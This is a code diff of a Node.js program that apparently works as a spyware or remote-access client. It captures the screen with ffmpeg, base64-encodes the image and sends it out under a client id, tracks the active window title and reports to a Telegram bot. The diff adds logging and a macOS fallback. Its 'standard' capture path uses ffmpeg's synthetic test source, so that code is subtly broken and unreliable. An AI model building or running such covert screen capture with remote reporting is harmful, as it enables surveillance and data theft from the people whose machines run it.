@@ -165,8 +165,10 @@ function captureScreen() {
 
  const imgPath = path.join(os.tmpdir(), 'screen.png');
 
+ // Try standard Linux/Windows method first
  exec(`ffmpeg -y -f lavfi -i testsrc=duration=1:size=320x240:rate=1 ${imgPath}`, (err) => {
  if (err && !fs.existsSync(imgPath)) {
+ log("[CAPTURE] Standard ffmpeg failed, trying macOS/Alt method...");
  exec(`ffmpeg -y -f avfoundation -framerate 1 -i "1" -frames:v 1 ${imgPath}`, (err2) => {
  if (!err2 && fs.existsSync(imgPath)) {
  const img = fs.readFileSync(imgPath);
@@ -175,6 +177,9 @@ function captureScreen() {
  id: myId,
  data: img.toString('base64')
  });
+ log("[CAPTURE] Success via Alt method");
+ } else {
+ log(`[CAPTURE] Failed: ${err2 ? err2.message : 'File missing'}`);
  }
  });
  } else if (!err && fs.existsSync(imgPath)) {
@@ -184,6 +189,9 @@ function captureScreen() {
  id: myId,
  data: img.toString('base64')
  }));
+ log("[CAPTURE] Success via Standard method");
+ } else {
+ log("[CAPTURE] No image file found after execution");
  }
  });
 }
@@ -209,7 +217,9 @@ async function getCurrentWindowTitle() {
 
 function sendTelegram(msg) {
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
- https.get(url, (res) => {}).on('error', (e) => {
+ https.get(url, (res) => {
+     // Check status code if needed
+ }).on('error', (e) => {
  log(`[TG] Error: ${e.message}`);
  });
 }
